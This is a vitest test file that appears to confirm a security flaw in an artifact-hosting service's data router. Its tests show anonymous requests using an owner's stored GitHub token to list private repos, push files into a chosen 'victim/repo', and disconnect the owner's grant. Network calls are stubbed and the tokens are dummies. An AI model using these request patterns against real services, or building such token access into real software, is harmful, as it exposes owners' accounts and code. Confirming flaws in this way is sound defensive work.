import { afterEach, beforeAll, describe, expect, it, vi } from 'vitest';
import { handleDataRequest } from '../../../src/data/router';
import { storeArtifactToken } from '../../../src/data/github/github-auth';
import { applyMigrations, e } from '../helpers/migrated-db';

const ART = 'art_f32_public';
const OWNER_TOKEN = 'gho_OWNER_DUMMY_TOKEN';

beforeAll(async () => {
  await applyMigrations();
  (e as { CREDENTIALS_KEY?: string }).CREDENTIALS_KEY = 'test-key-32-chars-long-enough!!!';
  (e as { SESSION_SECRET?: string }).SESSION_SECRET ||= 'test-session-secret-f32';
  await e.DB.batch([
    e.DB.prepare('INSERT OR IGNORE INTO users (id, email) VALUES (?, ?)').bind('usr_f32_owner', 'f32owner@x.test'),
    e.DB.prepare('INSERT INTO artifacts (id, name, slug, owner_id, visibility) VALUES (?, ?, ?, ?, ?)')
      .bind(ART, ART, `slug-${ART}`, 'usr_f32_owner', 'public'),
  ]);
  await e.DB.batch([
    e.DB.prepare('INSERT INTO versions (id, artifact_id, version_no, entrypoint, manifest_json) VALUES (?, ?, 1, ?, ?)').bind('ver_f32', ART, 'index.html', '{}'),
    e.DB.prepare("INSERT INTO deployments (id, artifact_id, version_id, channel, slug) VALUES ('dep_f32', ?, 'ver_f32', 'production', ?)").bind(ART, `slug-${ART}`),
    e.DB.prepare("INSERT INTO assets (id, version_id, path, r2_key, mime, size_bytes, sha256) VALUES (?, ?, ?, ?, ?, ?, 'x')").bind('ast_f32', 'ver_f32', 'index.html', 'f32/index.html', 'text/html', 5),
  ]);
  await e.ARTIFACTS.put('f32/index.html', 'hello');
  await storeArtifactToken(e, ART, OWNER_TOKEN, { login: 'owner-gh', id: 42 });
});

afterEach(() => vi.unstubAllGlobals());

function stubGitHub() {
  const calls: { url: string; method: string; auth: string | null; body: string | null }[] = [];
  vi.stubGlobal('fetch', async (input: RequestInfo | URL, init?: RequestInit) => {
    const url = typeof input === 'string' ? input : input instanceof URL ? input.href : input.url;
    const headers = new Headers(init?.headers);
    calls.push({ url, method: init?.method ?? 'GET', auth: headers.get('Authorization'), body: (init?.body as string) ?? null });
    const json = (b: unknown, status = 200) => new Response(JSON.stringify(b), { status, headers: { 'Content-Type': 'application/json' } });
    if (url.includes('/user/repos')) return json([{ name: 'secret-repo', full_name: 'owner-gh/secret-repo', private: true, html_url: 'https://github.com/owner-gh/secret-repo', default_branch: 'main' }]);
    if (url.includes('/contents/')) return json({ content: { sha: 's' } });
    return json({ name: 'r', full_name: 'owner-gh/r', html_url: 'https://github.com/owner-gh/r', default_branch: 'main', private: false, owner: { login: 'owner-gh' } });
  });
  return calls;
}

describe('f32 github tier', () => {
  it('CONFIRMS: anonymous visitor of a public artifact lists owner private repos with the owner token', async () => {
    const calls = stubGitHub();
    const res = await handleDataRequest(new Request(`https://so.test/v1/data/${ART}/github/repos`), e, `${ART}/github/repos`);
    const body = await res.json() as any;
    console.log('REPOS', res.status, JSON.stringify(body), JSON.stringify(calls.map(c => [c.url, c.auth])));
    expect(res.status).toBe(200);
    expect(JSON.stringify(body)).toContain('secret-repo');
    expect(calls.some((c) => c.url.includes('api.github.com') && c.auth === `Bearer ${OWNER_TOKEN}`)).toBe(true);
  });

  it('CONFIRMS: anonymous visitor can push files to a caller-chosen repo with the owner token', async () => {
    const calls = stubGitHub();
    const res = await handleDataRequest(
      new Request(`https://so.test/v1/data/${ART}/github/export`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ repo: 'victim/repo', branch: 'main', pathPrefix: 'pwn' }),
      }), e, `${ART}/github/export`);
    const text = await res.text();
    console.log('EXPORT', res.status, text, JSON.stringify(calls.map(c => [c.method, c.url, c.auth])));
    expect(res.status).toBeLessThan(300);
    expect(calls.some((c) => c.method === 'PUT' && c.url.includes('/repos/victim/repo/contents/') && c.auth === `Bearer ${OWNER_TOKEN}`)).toBe(true);
  });

  it('CONFIRMS: anonymous visitor can read status and disconnect the owner GitHub grant', async () => {
    stubGitHub();
    const st = await handleDataRequest(new Request(`https://so.test/v1/data/${ART}/github/token-status`), e, `${ART}/github/token-status`);
    expect(st.status).toBe(200);
    expect(JSON.stringify(await st.json())).toContain('owner-gh');
    const del = await handleDataRequest(new Request(`https://so.test/v1/data/${ART}/github/disconnect`, { method: 'POST' }), e, `${ART}/github/disconnect`);
    console.log('DISCONNECT', del.status);
    expect(del.status).toBe(200);
    const row = await e.DB.prepare("SELECT id FROM connections WHERE scope_id = ? AND provider = 'github'").bind(ART).first();
    expect(row).toBeNull();
  });
});
